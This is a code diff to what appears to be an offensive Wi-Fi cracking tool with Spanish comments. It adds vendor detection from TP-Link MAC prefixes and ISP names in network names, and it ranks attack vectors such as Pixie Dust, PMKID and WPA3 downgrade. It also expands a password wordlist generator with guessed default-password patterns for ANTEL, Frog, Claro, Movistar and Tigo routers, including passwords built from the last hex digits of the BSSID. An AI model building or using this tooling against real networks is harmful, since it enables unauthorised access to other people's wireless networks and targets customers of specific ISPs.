@@ -3063,8 +3063,9 @@ _VULN_SCORES = {
 
 def _score_network(red, wps_list=None):
     """Calcula puntuación de vulnerabilidad y mejor vector de ataque."""
-    priv = red.get("privacy","").upper()
-    bssid = red.get("bssid","")
+    priv  = red.get("privacy","").upper()
+    bssid = red.get("bssid","").upper()
+    essid = red.get("essid","").upper()
     score = 0
     vector = []
 
@@ -3076,9 +3077,25 @@ def _score_network(red, wps_list=None):
         vector = ["OPEN"]
     else:
         has_wps = wps_list and any(bssid.lower() in w.lower() for w in wps_list)
+
+        # Detección de marca: TP-Link casi siempre tiene WPS activo por defecto
+        _TPLINK_OUIS = {"E8:65:D4","A0:F3:C1","50:C7:BF","98:DA:C4",
+                        "B0:BE:76","C8:3A:35","54:A7:03","18:D6:C7",
+                        "74:DA:38","F4:F2:6D","DC:FE:18","30:DE:4B",
+                        "00:1D:0F","14:CC:20","1C:61:B4"}
+        oui = ":".join(bssid.split(":")[:3])
+        is_tplink   = ("TP-LINK" in essid or "TPLINK" in essid or oui in _TPLINK_OUIS)
+        is_antel    = ("ANTEL" in essid)
+        is_frog     = ("FROG" in essid or "WIFIFROG" in essid)
+        is_claro    = ("CLARO" in essid)
+        is_movistar = ("MOVISTAR" in essid or "MOVISTAR" in essid)
+
+        if is_tplink:
+            has_wps = True   # TP-Link tiene WPS por defecto en la mayoría de modelos
         if has_wps:
             score = max(score, _VULN_SCORES["WPS_YES"])
             vector.append("PIXIE_DUST")
+
         if "WPA2" in priv or "WPA3" in priv:
             score = max(score, _VULN_SCORES["WPA2_PMKID"])
             vector.append("PMKID")
@@ -3086,6 +3103,13 @@ def _score_network(red, wps_list=None):
         elif "WPA" in priv:
             score = max(score, _VULN_SCORES["WPA_ONLY"])
             vector.append("HANDSHAKE")
+
+        # Bonus por ISP/marca conocida con contraseñas predecibles
+        if is_antel or is_frog or is_claro or is_movistar:
+            score = min(score + 15, 95)
+            if "DEFAULT_PASS" not in vector:
+                vector.insert(0, "DEFAULT_PASS")
+
         if "WPA3" in priv and "WPA2" not in priv:
             score = max(score, _VULN_SCORES["WPA3"])
             vector = ["DRAGONBLOOD_DOWNGRADE"]
@@ -4905,7 +4929,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
 
                 # Generar wordlist SSID primero
                 ssid_wl = f"exploit-engine/ssid_{essid_s}.txt"
-                _gen_ssid_wordlist(essid, ssid_wl)
+                _gen_ssid_wordlist(essid, ssid_wl, bssid)
 
                 # Crackear PMKID: 1) SSID wordlist 2) wordlist principal
                 for wl in [ssid_wl, wordlist]:
@@ -5026,28 +5050,70 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
     return None, "sin_resultado"
 
 
-def _gen_ssid_wordlist(essid: str, output_path: str):
-    """Genera wordlist basada en el SSID + patrones comunes + variaciones."""
+def _gen_ssid_wordlist(essid: str, output_path: str, bssid: str = ""):
+    """Genera wordlist basada en el SSID + patrones comunes + variaciones por ISP."""
     words = set()
-    base = re.sub(r'[^a-zA-Z0-9]', '', essid).lower()
-    words.add(essid); words.add(essid.lower()); words.add(essid.upper())
-    words.add(base); words.add(base.capitalize())
-    # Sufijos numéricos
-    for n in range(0, 10): words.add(f"{base}{n}"); words.add(f"{essid}{n}")
-    for n in [12,123,1234,12345,123456,2023,2024,2025]:
-        words.add(f"{base}{n}"); words.add(f"{essid}{n}")
-        words.add(f"{base.capitalize()}{n}")
-    # ISP típicos españoles y LATAM
+    base  = re.sub(r'[^a-zA-Z0-9]', '', essid).lower()
+    nums  = re.findall(r'\d+', essid)          # números del SSID
+    bssid_clean = bssid.replace(":", "").replace("-", "").lower()
+
+    words.update([essid, essid.lower(), essid.upper(), base, base.capitalize()])
+
+    # Sufijos numéricos universales
+    for n in list(range(0,10)) + [12,123,1234,12345,123456,2023,2024,2025,2026]:
+        words.update([f"{base}{n}", f"{essid}{n}", f"{base.capitalize()}{n}"])
     for suffix in ["wifi","wlan","home","casa","red","net","pass","key",
-                   "admin","user","1234","0000","password","clave"]:
-        words.add(f"{base}{suffix}"); words.add(f"{suffix}{base}")
-        words.add(f"{base.capitalize()}{suffix.capitalize()}")
-    # Movistar/Claro/Tigo/Vodafone patrones
-    for isp_patt in [
-        f"movistar{base[:4]}",f"claro{base[:4]}",f"tigo{base[:4]}",
-        f"vodafone{base[:4]}",f"orange{base[:4]}",f"jazztel{base[:4]}",
-    ]:
-        words.add(isp_patt)
+                   "admin","user","1234","0000","password","clave","internet"]:
+        words.update([f"{base}{suffix}", f"{suffix}{base}",
+                      f"{base.capitalize()}{suffix.capitalize()}"])
+
+    essid_up = essid.upper()
+
+    # ── TP-Link ──────────────────────────────────────────────────────────────
+    if "TP-LINK" in essid_up or "TPLINK" in essid_up:
+        for n in nums:
+            words.update([n, f"tplink{n}", f"tp-link{n}", f"admin{n}",
+                          f"password{n}", f"tp{n}link"])
+        words.update(["admin1234","tplinkadmin","tplink123","12345678",
+                      "tplink1234","password","administrator"])
+
+    # ── ANTEL (ISP Uruguay) ──────────────────────────────────────────────────
+    if "ANTEL" in essid_up:
+        # Patrón ANTEL: últimos 4 y 6 hex del BSSID como contraseña por defecto
+        if bssid_clean:
+            last4 = bssid_clean[-4:]; last6 = bssid_clean[-6:]; last8 = bssid_clean[-8:]
+            words.update([last4, last6, last8,
+                          f"antel{last4}", f"antel{last6}",
+                          bssid_clean[-4:].upper(), bssid_clean[-6:].upper()])
+        for n in nums:
+            words.update([f"antel{n}", f"ANTEL{n}", n])
+        words.update(["antel1234","antel123","antel12345","anteladmin",
+                      "internet1","internet123","antel2024","antel2025"])
+
+    # ── Frog / wififrog (reseller ANTEL Uruguay) ──────────────────────────────
+    if "FROG" in essid_up or "WIFIFROG" in essid_up:
+        if bssid_clean:
+            last4 = bssid_clean[-4:]; last6 = bssid_clean[-6:]
+            words.update([last4, last6, f"frog{last4}", f"frog{last6}",
+                          f"wifi{last4}", f"wififrog{last4}"])
+        for n in nums:
+            words.update([f"frog{n}", f"wififrog{n}", f"wifi{n}", n])
+        words.update(["frogadmin","frog1234","frog12345","wififrog123",
+                      "frog2024","frog2025","internet1","frogwifi"])
+
+    # ── Claro / Movistar / Tigo ───────────────────────────────────────────────
+    for isp in [("CLARO","claro"), ("MOVISTAR","movistar"), ("TIGO","tigo"),
+                ("PERSONAL","personal"), ("FLOW","flow")]:
+        if isp[0] in essid_up:
+            for n in nums:
+                words.update([f"{isp[1]}{n}", f"{isp[1]}wifi{n}"])
+            words.update([f"{isp[1]}1234", f"{isp[1]}admin",
+                          f"{isp[1]}12345", f"{isp[1]}internet"])
+
+    # Números del SSID solos (contraseña = números del nombre de la red)
+    for n in nums:
+        words.add(n)
+
     with open(output_path, "w") as wf:
         for w in sorted(words):
             if len(w) >= 8:
